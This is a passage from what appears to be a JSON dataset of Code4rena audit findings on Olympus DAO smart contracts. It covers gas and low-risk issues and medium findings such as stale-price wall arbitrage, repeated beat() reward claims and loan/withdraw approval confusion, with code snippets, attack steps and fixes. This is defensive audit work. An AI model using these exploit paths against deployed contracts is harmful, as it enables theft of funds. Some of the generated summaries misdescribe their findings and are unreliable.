      "content": "\nIf needed, the value can be read from the verified contract source code. Savings are due to the compiler not having to create non-payable getter functions for deployment calldata, and not adding another entry to the method ID table\n\nDeployment Gas Saved: **45 857**<br>\nMethod Call Gas Saved: **308**<br>\n\n*   src/policies/Governance.sol:[119-137](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L119-L137)\n\n```solidity\n119    /// @notice The amount of votes a proposer needs in order to submit a proposal as a percentage of total supply (in basis points).\n120    /// @dev    This is set to 1% of the total supply.\n121    uint256 public constant SUBMISSION_REQUIREMENT = 100;\n122\n123    /// @notice Amount of time a submitted proposal has to activate before it expires.\n124    uint256 public constant ACTIVATION_DEADLINE = 2 weeks;\n125\n126    /// @notice Amount of time an activated proposal must stay up before it can be replaced by a new activated proposal.\n127    uint256 public constant GRACE_PERIOD = 1 weeks;\n128\n129    /// @notice Endorsements required to activate a proposal as percentage of total supply.\n130    uint256 public constant ENDORSEMENT_THRESHOLD = 20;\n131\n132    /// @notice Net votes required to execute a proposal on chain as a percentage of total supply.\n133    uint256 public constant EXECUTION_THRESHOLD = 33;\n134\n135    /// @notice Required time for a proposal to be active before it can be executed.\n136    /// @dev    This amount should be greater than 0 to prevent flash loan attacks.\n137    uint256 public constant EXECUTION_TIMELOCK = 3 days;\n```\n\n*   src/policies/Operator.sol:[89](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L89)\n\n```solidity\n89     uint32 public constant FACTOR_SCALE = 1e4;\n```\n\n*   src/modules/RANGE.sol:[65](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/RANGE.sol#L65)\n\n```solidity\n65     uint256 public constant FACTOR_SCALE = 1e4;\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "#g-03--using-private-rather-than-public-for-constants-saves-gas-8-instances",
      "tags": [],
      "finders": []
    },
    {
      "id": "5140",
      "title": "[G-01]  Replace `modifier` with `function` (6 instances)",
      "impact": "GAS",
      "content": "\nModifiers make code more elegant, but cost more than normal functions.\n\nDeployment Gas Saved: **460 154**\n\nAll modifiers except `permissioned` due to unresolved error flow.\n\n*   src/Kernel.sol:[70-73](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L70-L73), [119-123](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L119-L123), [223-232](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L223-L232)\n\n```solidity\n70     modifier onlyKernel() {\n71         if (msg.sender != address(kernel)) revert KernelAdapter_OnlyKernel(msg.sender);\n72         _;\n73     }\n...\n119    modifier onlyRole(bytes32 role_) {\n120        Role role = toRole(role_);\n121        if (!kernel.hasRole(msg.sender, role)) revert Policy_OnlyRole(role);\n122        _;\n123    }\n...\n223    modifier onlyExecutor() {\n224        if (msg.sender != executor) revert Kernel_OnlyExecutor(msg.sender);\n225        _;\n226    }\n227\n228    /// @notice Modifier to check if caller is the roles admin.\n229    modifier onlyAdmin() {\n230        if (msg.sender != admin) revert Kernel_OnlyAdmin(msg.sender);\n231        _;\n232    }\n```\n\n*   src/policies/Operator.sol:[188-191](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L188-L191)\n\n```solidity\n188    modifier onlyWhileActive() {\n189        if (!active) revert Operator_Inactive();\n190        _;\n191    }\n```\n\n*   [src/modules/PRICE.sol](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol)\n\n```solidity\nif (!initialized) revert Price_NotInitialized(); // @note 4 instances\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "#g-01--replace-modifier-with-function-6-instances",
      "tags": [],
      "finders": []
    },
    {
      "id": "5139",
      "title": "[L-09] Heart: if the issueReward fails the heart beat will revert",
      "impact": "LOW",
      "content": "\n*   <https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Heart.sol#L106>\n\nIf the `_issueReward` reverts, for example, because the token balance is too low, the `beat` will as well revert, due to the `safeTransfer`. One might consider not to revert even in the case the `_issueReward` reverts.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "#l-09-heart-if-the-issuereward-fails-the-heart-beat-will-revert",
      "tags": [],
      "finders": []
    },
    {
      "id": "5138",
      "title": "[L-08] BondCallback, Operator: upon module's upgrade, the token approval should be revoked",
      "impact": "LOW",
      "content": "\n*   <https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/BondCallback.sol#L57>\n*   <https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L167>\n\nThe `BondCallback` and `Operator` approves ohm to the `MINTR` module in the `configureDependencies`. However, there is no logic to revoke those approvals (e.i. approve to zero). In the case of the `MINTR` has some bugs, it may be desirable to be able to revoke the approvals.\n\n```solidity\n// Operator::configureDependencies\n167         ohm.safeApprove(address(MINTR), type(uint256).max);\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "#l-08-bondcallback-operator-upon-modules-upgrade-the-token-approval-should-be-revoked",
      "tags": [],
      "finders": []
    },
    {
      "id": "5137",
      "title": "[L-07] Kernel: misplaced zero address check for `changeKernel`",
      "impact": "LOW",
      "content": "\n*   <https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L76-L78>\n*   <https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L254-L257>\n\nCurrently, the check for the `Kernel` to be a contract (also not to be the zero address), is in the current `Kernel` implementation. However, no modules and policies have the logic to ensure this as they inherit from `KernelAdapter`, which will just set the new kernel without a question. This will work well as long as the new Kernel has the similar logic to check the next Kernel's integrity. However, if the logic is forgotten, there is no other safe guard to ensure that the next kernel is not a zero address and is a contract.\nSince `Kernel` is absolutely needed for this system's functionality, there is no possible case that the Kernel should be the zero address. Therefore, it is probably safe to add the checking logic to the `KernelAdapter`, so every module and policy will check for the next Kernel. It costs more gas since the check is done multiple times, but still arguably it is worth the cost, since Kernel is core part of the system and it will not updated very often.\n\n```solidity\n// KernelAdapter::changeKernel\n 76     function changeKernel(Kernel newKernel_) external onlyKernel {\n 77         kernel = newKernel_;\n 78     }\n\n// Kernel::executeAction\n254         } else if (action_ == Actions.MigrateKernel) {\n255             ensureContract(target_);\n256             _migrateKernel(Kernel(target_));\n257         }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "#l-07-kernel-misplaced-zero-address-check-for-changekernel",
      "tags": [],
      "finders": []
    },
    {
      "id": "5136",
      "title": "[L-06] Operator: missing check for configParmas\\[0] (cushionFactor) in the constructor",
      "impact": "LOW",
      "content": "\n*   <https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L92-L150>\n*   <https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L516-L524>\n\nThe `Operator::constructor` does not check the condition of the `cushionFactor`. Below is the condition for the `cushionFactor` checked in the `Operator::setCushionFactor`.\n\n```solidity\n// Operator::setCushionFactor\n\n516     function setCushionFactor(uint32 cushionFactor_) external onlyRole(\"operator_policy\") {\n517         /// Confirm factor is within allowed values\n518         if (cushionFactor_ > 10000 || cushionFactor_ < 100) revert Operator_InvalidParams();\n519\n520         /// Set factor\n521         _config.cushionFactor = cushionFactor_;\n522\n523         emit CushionFactorChanged(cushionFactor_);\n524     }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "#l-06-operator-missing-check-for-configparmas0-cushionfactor-in-the-constructor",
      "tags": [],
      "finders": []
    },
    {
      "id": "5135",
      "title": "[L-05] BondCallback: operator is not set `constructor`",
      "impact": "LOW",
      "content": "\n*   <https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/BondCallback.sol#L38-L45>\n\nIf the `operator` is not set, the `callback` function will revert so, it is crucial to set the `operator` before any operation. However, it was not set in the `constructor`, but should be set separately by calling `setOperator`.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "#l-05-bondcallback-operator-is-not-set-constructor",
      "tags": [],
      "finders": []
    },
    {
      "id": "5134",
      "title": "[L-04] Operator: unsafe cast for decimals",
      "impact": "LOW",
      "content": "\n*   <https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L372>\n*   <https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L427>\n*   <https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L431-L434>\n*   <https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L375-L379>\n\nIn the `Operator::_activate` decimal values were casted to `int8` and `uint8` back and forth. Since there is no check, those values can potentially overflow/underflow. However, if it happens the exponent in the line 376 will like to revert due to too large numbers. Besides, if the price decimals are that big, this may not be the biggest problem to face.\n\n```solidity\n// policies/Operator.sol::_activate\n\n372             int8 scaleAdjustment = int8(ohmDecimals) - int8(reserveDecimals) + (priceDecimals / 2);\n\n375             uint256 oracleScale = 10**uint8(int8(PRICE.decimals()) - priceDecimals);\n376             uint256 bondScale = 10 **\n377                 uint8(\n378                     36 + scaleAdjustment + int8(reserveDecimals) - int8(ohmDecimals) - priceDecimals\n379                 );\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "#l-04-operator-unsafe-cast-for-decimals",
      "tags": [],
      "finders": []
    },
    {
      "id": "5133",
      "title": "[L-03] PRICE: unsafe cast for `numObservations`",
      "impact": "LOW",
      "content": "\n*   <https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L97>\n*   <https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L249-L257>\n*   <https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L281-L289>\n\nThe `movingAverageDuration` and `observationFrequency` are uint48. So `movingAverageDuration / observationFrequency` may overflow when casted to uint32. In the below snippet, line 281, the array will be set based on the uint256 value, but the `numObservations` is casted down to uint32. It may result in different `numObservations` and the length of `observations` array.\nHowever, given the large numbers, the attempt to set such a large number as the parameters will likely to fail with \"out of gas\" error, since the length of the array `observations` is ridiculously large in this case. Yet, it is probably safe to set some upper limit for the `numObservations` or use safeCast.\n\n```solidity\n// modules/PRICE::constructor\n  97         numObservations = uint32(movingAverageDuration_ / observationFrequency_);\n\n// modules/PRICE::changeObservationFrequency\n  280         // Store blank observations array of new size\n  281         observations = new uint256[](newObservations);\n  282\n  283         // Set initialized to false and update state variables\n  284         initialized = false;\n  285         lastObservationTime = 0;\n  286         _movingAverage = 0;\n  287         nextObsIndex = 0;\n  288         observationFrequency = observationFrequency_;\n  289         numObservations = uint32(newObservations);\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "#l-03-price-unsafe-cast-for-numobservations",
      "tags": [],
      "finders": []
    },
    {
      "id": "5132",
      "title": "[L-02] BondCallback: incorrect accounting if quoteToken is rebase token",
      "impact": "LOW",
      "content": "\n*   <https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/BondCallback.sol#L114>\n\nIf the quoteToken is rebase token, the priorBalances may change due to rebasing or airdrop. It may result to an incorrect accounting. However, whether it is exploitable depends on the Bond market's logic.<br>\nWith the current logic, it just checks whether the balance is increased more than the `inputAmount_`, so it is harder to exploit, compare to the alternative logic of using the difference in balances as the input amount. However, it also introduces the possibility of paying the users less than they deserve.\n\n```solidity\n// Callback::callback\n113         // Check that quoteTokens were transferred prior to the call\n114         if (quoteToken.balanceOf(address(this)) < priorBalances[quoteToken] + inputAmount_)\n115             revert Callback_TokensNotReceived();\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "#l-02-bondcallback-incorrect-accounting-if-quotetoken-is-rebase-token",
      "tags": [],
      "finders": []
    },
    {
      "id": "5131",
      "title": "[L-01] Operator: incorrect accounting for fee-on-transfer reserve token",
      "impact": "LOW",
      "content": "\n*   <https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L330>\n\nIf the reserve token is fee-to-transfer token and the user is buying ohm, the `Operator::swap` will incorrectly assume the `amountIn_` value is transferred, which fails to consider the fees. If the fee is rounded up, the attacker can purchase ohm without giving any assets to the treasury. It may not be profitable for the attacker, but it may cause devaluing of the ohm. However, the loss will be limited to the capacity.\n\n```solidity\n// Operator::swap\n// if(tokenIn_ == reserve) : buying ohm\n329             /// Transfer reserves to treasury\n330             reserve.safeTransferFrom(msg.sender, address(TRSRY), amountIn_);\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "#l-01-operator-incorrect-accounting-for-fee-on-transfer-reserve-token",
      "tags": [],
      "finders": []
    },
    {
      "id": "3236",
      "title": "[M-32] Admin cannot be changed to EOA after deployment",
      "impact": "MEDIUM",
      "content": "_Submitted by Jeiwan, also found by datapunk_\n\nAfter contracts are deployed and initialized, the admin address in `Kernel` contract can only be set to a contract. Granting and revoking roles will be possible to do only via a contract, which looks like an unintended behavior since these operations cannot be performed via governance (the governance contract is designed to be the only executor).\n\n### Proof of Concept\n\nAdmin address can be changed to any address (EOA or contract) in the `executeAction` function in `Kernel`:<br>\n<https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L252-L253>\n\nThis piece explicitly allows EOA addresses since the other actions in the function (besides `ChangeExecutor`) are checked to have only a contract as the target (see `ensureContract` function calls in the other actions). This, and the fact that roles cannot be managed via governance, leads to the conclusion that an admin is designed to be an EOA.\n\nHowever, in the `store` function in `INSTR`, action target can only be a contract:<br>\n<https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/INSTR.sol#L52>\n\nAfter the contracts are deployed, `INSTR` will be the only contract that's allowed to call `Kernel.executeAction`:<br>\n<https://github.com/code-423n4/2022-08-olympus/blob/main/src/scripts/Deploy.sol#L220>\n\nThus, there will be no way to change admin to an EOA. If admin needs to be an EOA, the `INSTR` contract needs to be patched and re-deployed to allow non-contract targets.\n\n### Recommended Mitigation Steps\n\nAllow EOA addresses as instruction targets or disallow non-contract admin addresses.\n\n**[fullyallocated (Olympus) confirmed and commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/94#issuecomment-1234801408):**\n > Nice find + writeup.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the code of a contract deployment. The vulnerability is that after contracts are deployed and initialized, the admin address in the 'Kernel' contract can only be set to a contract. This means that granting and revoking roles can only be done through a contract, which is an unintended behavior since these operations should be done through governance. The bug can be exploited by changing the admin address to any address (EOA or contract) in the 'executeAction' function in 'Kernel'. To fix the vulnerability, the recommended mitigation steps are to either allow EOA addresses as instruction targets or disallow non-contract admin addresses.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "https://github.com/code-423n4/2022-08-olympus-findings/issues/94",
      "tags": [],
      "finders": [
        "Jeiwan",
        "datapunk"
      ]
    },
    {
      "id": "3235",
      "title": "[M-31] Protocol's Walls / cushion bonds remain active even if heart is not beating",
      "impact": "MEDIUM",
      "content": "_Submitted by Trust_\n\n<https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L188-L191><br>\n<https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L272><br>\n<https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L346><br>\n\nThe Walls of the RBS mechanism offer zero slippage swaps at the high and low of the moving average spread. The capacity to be swapped at these prices is usually very large, so it must make sure to only be enabled when the prices are guaranteed to be synced. However, there is no such check. If beat() is not called for some time, meaning we cannot determine if the current spread is legit, swap() still operates as usual.\n\n### Impact\n\nThe worst case scenario is that the wall is swapping at a losing price, meaning they can be immediately drained via arbitrage bot.\n\n### Proof of concept\n\n    1. Price is X at the start\n    2. Oracle stops updating for some reason / no one calls beat()\n    3. Price drops to Y , where Y < low wall centered around X\n    4. Attacker can perform arbitrage by buying Ohm at external markets at Y and selling Ohm at low wall price, netting the difference.\n\n### Recommended mitigation steps:\n\nChange modifier onlyWhileActive to add a check for beat out of sync:\n\n    if (block.timestamp > lastBeat + SYNC_THRESHOLD * frequency())\n\n**[Oighty (Olympus) confirmed and commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/89#issuecomment-1238784898):**\n > This is an interesting unintended consequence of a bad price feed or other `beat()` issue. Your suggested update makes sense, but we will probably adjust slightly to only manage the bad data threshold in one place. \n> \n> After originally looking at it, I thought a try/catch block on the external call to `PRICE.getLastPrice()` in `Operator.operate()` would work, but it doesn't handle cases where `operate()` isn't reached by the `beat()` function.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the RBS mechanism of the code-423n4/2022-08-olympus repository. This mechanism offers zero slippage swaps at the high and low of the moving average spread, but there is no check to ensure that the current spread is legitimate. If the Oracle stops updating or beat() isn't called for some time, the swap() can still operate as usual, leading to a worst case scenario where the wall is swapping at a losing price and can be immediately drained via an arbitrage bot. To prove this concept, a scenario is listed where the price drops below the low wall centered around the original price. \n\nThe recommended mitigation step is to change the modifier onlyWhileActive to add a check for beat out of sync. This check should be a comparison of the current block timestamp and the lastBeat timestamp, plus a SYNC_THRESHOLD multiplied by the frequency. This will ensure that the swap() is only enabled when the prices are guaranteed to be synced.",
      "quality_score": 4,
      "rarity_score": 3,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "https://github.com/code-423n4/2022-08-olympus-findings/issues/89",
      "tags": [
        "Stale Price",
        "Validation"
      ],
      "finders": [
        "Trust"
      ]
    },
    {
      "id": "3234",
      "title": "[M-30] `Heart::beat()` could be called several times in one block if no one called it for a some time",
      "impact": "MEDIUM",
      "content": "_Submitted by rvierdiiev, also found by datapunk, devtooligan, itsmeSTYJ, Jeiwan, Lambda, Trust, and zzzitron_\n\n`beat()` function is allowed to be called by anyone once in `frequency()` period. The purpose of it is to update the prices and do another operations related to bond market. User who ran it are rewarded. There is no need to run this function more then 1 time in `frequency()` period.\nHowever if `beat()` was last time called more then `frequency()` time ago then user can execute `beat()` function `(block.timestamp - lastBeat)/frequency()` times in a row in same block and get rewards.\n\n### Proof of Concept\n\n<https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L92><br>\n<https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L103>\n\n### Recommended Mitigation Steps\n\n<https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L103><br>\nChange this line to `lastBeat = block.timestamp - (block.timestamp - lastBeat) % frequency();`<br>\nSo no matter how much time the `beat()` was not called, it is possible to call it only once per `frequency()`.\n\n**[Oighty (Olympus) confirmed and commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/79#issuecomment-1239882530):**\n > See comment on [#405](https://github.com/code-423n4/2022-08-olympus-findings/issues/405#issuecomment-1239878294). This approach actually solves both of our issues though.\n\n**[0xean (judge) commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/79#issuecomment-1251018524):**\n > Going to use this issue as the primary since the solution is elegant and solves the problem. \n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the `beat()` function of the Heart.sol code. This function is used to update prices and do other operations related to the bond market. Users are rewarded for running this function, however, if it has not been run in the last `frequency()` period, a user could call it multiple times in a row and receive multiple rewards. The recommended mitigation step for this vulnerability is to change line 103 of the Heart.sol code to `lastBeat = block.timestamp - (block.timestamp - lastBeat) % frequency();`. This will ensure that the `beat()` function can only be called once per `frequency()` period.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "https://github.com/code-423n4/2022-08-olympus-findings/issues/79",
      "tags": [],
      "finders": [
        "Trust",
        "datapunk",
        "Jeiwan",
        "devtooligan",
        "Lambda",
        "itsmeSTYJ",
        "zzzitron",
        "rvierdiiev"
      ]
    },
    {
      "id": "3233",
      "title": "[M-29] TRSRY susceptible to loan / withdraw confusion",
      "impact": "MEDIUM",
      "content": "_Submitted by Trust, also found by 0xSky, datapunk, and tonisives_\n\n<https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L64-L102><br>\n\nTreasury allocates approvals in the withdrawApproval mapping which is set via setApprovalFor(). In both withdrawReserves() and in getLoan(), \\_checkApproval() is used to verify user has enough approval and subtracts the withdraw / loan amount. Therefore, there is no differentiation in validation between loan approval and withdraw approval. Policies which will use getLoan() (currently none) can simply withdraw the tokens without bookkeeping it as a loan.\n\n### Proof of Concept\n\n1.  Policy P has getLoan permission\n2.  setApprovalFor(policy, token, amount) was called to grant P permission to loan amount\n3.  P calls withdrawReserves(address, token, amount) and directly withdraws the funds without registering as loan\n\n### Recommended Mitigation Steps\n\nA separate mapping called loanApproval should be implemented, and setLoanApprovalFor() will set it, getLoan() will reduce loanApproval balance.\n\n**[ind-igo (Olympus) confirmed, but disagreed with severity and commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/75#issuecomment-1239657706):**\n > Confirmed. Good suggestion. Would put as low risk though.\n\n**[0xean (judge) commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/75#issuecomment-1250396074):**\n > Currently thinking Medium is appropriate for this issue, but will circle back on it. \n\n**[0xean (judge) commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/75#issuecomment-1251404052):**\n > See [#293](https://github.com/code-423n4/2022-08-olympus-findings/issues/293) for a possible vector in which this could lead to loss of funds.  Going to leave as Medium.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the code of a software system. The code in question is located at the GitHub link provided, and the vulnerability allows users with the permission to take out a loan to directly withdraw funds without registering it as a loan. This could have serious financial implications for the system. \n\nThe proof of concept provided in the report outlines how the vulnerability could be exploited. The recommended mitigation steps suggest implementing a separate mapping called loanApproval and creating two new functions, setLoanApprovalFor() and getLoan(), to set and reduce the loanApproval balance, respectively. This would ensure that any loans taken out are properly registered and tracked. \n\nIn conclusion, this bug report outlines a vulnerability in the code of a software system that could have serious financial implications if exploited. The recommended mitigation steps provided in the report should be implemented to ensure that any loans taken out are properly registered and tracked.",
      "quality_score": 4,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "https://github.com/code-423n4/2022-08-olympus-findings/issues/75",
      "tags": [
        "Business Logic",
        "Approve"
      ],
      "finders": [
        "tonisives",
        "Trust",
        "0xSky",
        "datapunk"
      ]
    },
    {
      "id": "3232",
      "title": "[M-28] Activating same Policy multiple times in Kernel possible",
      "impact": "MEDIUM",
      "content": "_Submitted by Lambda, also found by enckrish_\n\n<https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/Kernel.sol#L296><br>\n\nTo check that an already active policy is not added a second time, `isActive()` is called on the policy. However, `policy` could be a malicious contract that always returns `false` for `isActive()`. In such a scenario, it would be possible to activate the policy multiple times for the same Kernel. This would break uniqueness invariants such that `_deactivatePolicy()` no longer works. However, it could also be used for a DoS attack: As `_reconfigurePolicies` and `_migrateKernel` iterate over those lists that now contain duplicates, they could run out of gas if a policy is activated enough times.\n\n### Recommended Mitigation Steps\n\nCheck `getPolicyIndex[policy_] != 0` instead of relying on a value of an untrusted contract.\n\n**[0xLienid (Olympus) commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/52#issuecomment-1238281166):**\n > @ind-igo a few other submissions also mention problems with over-reliance on policy.isActive (i.e. [#368](https://github.com/code-423n4/2022-08-olympus-findings/issues/368)). Might be worth mitigating with the suggested step here or the check on activePolicies[index] like 368 mentions.\n\n**[ind-igo (Olympus) commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/52#issuecomment-1241161485):**\n > Dupe of #368 \n\n**[0xean (judge) commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/52#issuecomment-1251630127):**\n > I think this is separate from #368 which is about a policy deactivating that isn't already active. \n> \n> I am a bit skeptical at the impact statement currently, but it does seem like protocol functionality does end up in a bad state with the typical policy lifecycle here. Will award as Medium unless Sponsor wants to provide some additional reasoning as to a downgrade. \n\n**[ind-igo (Olympus) commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/52#issuecomment-1271829178):**\n > While the issue is slightly different from #368, the solution is the exact same. The remediation has the new checks to prevent both of these issues.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the code of the project \"2022-08-olympus\". The vulnerability can be exploited to activate a policy multiple times for the same Kernel. This would break the uniqueness invariants and could be used for a DoS attack. The recommended mitigation step is to check that `getPolicyIndex[policy_] != 0` instead of relying on a value of an untrusted contract. This would prevent the policy from being activated multiple times.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "https://github.com/code-423n4/2022-08-olympus-findings/issues/52",
      "tags": [],
      "finders": [
        "Lambda",
        "enckrish"
      ]
    },
    {
      "id": "3231",
      "title": "[M-27] Unexecutable proposals when `Actions.MigrateKernel` is not last instruction",
      "impact": "MEDIUM",
      "content": "_Submitted by Lambda_\n\n<https://github.com/code-423n4/2022-08-olympus/blob/549b96bcf8b97807738572605f6b1e26b33ef411/src/modules/INSTR.sol#L61><br>\n\nIn `INSTR.sol`, it is correctly checked that a `ChangeExecutor` instruction only occurs at the last position to avoid situations where the other instructions are deemed as invalid.<br>\nHowever, the same problem can occur for `MigrateKernel`. For instance, let's say we have a `MigrateKernel` followed by a `DeactivatePolicy` action. The `MigrateKernel` action will change the value of `kernel` within the policy. The `DeactivatePolicy` action tries to call `setActiveStatus` on the policy. However, this has a `onlyKernel` modifier and the call will therefore fail when it is done after the value of `kernel` was changed.\n\n### Recommended Mitigation Steps\n\nPerform the same check for `MigrateKernel`.\n\n**[fullyallocated (Olympus) confirmed and commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/51#issuecomment-1236245145):**\n > Thank you; good catch\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability found in the INSTR.sol file of the code-423n4/2022-08-olympus repository. The vulnerability occurs when a MigrateKernel action is followed by a DeactivatePolicy action. This can cause the call to setActiveStatus on the policy to fail as the value of kernel has been changed. The recommended mitigation step is to perform the same check for MigrateKernel as is done for ChangeExecutor instruction.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "https://github.com/code-423n4/2022-08-olympus-findings/issues/51",
      "tags": [],
      "finders": [
        "Lambda"
      ]
    },
    {
      "id": "3230",
      "title": "[M-26] Cushion bond markets are opened at wall price rather than current price",
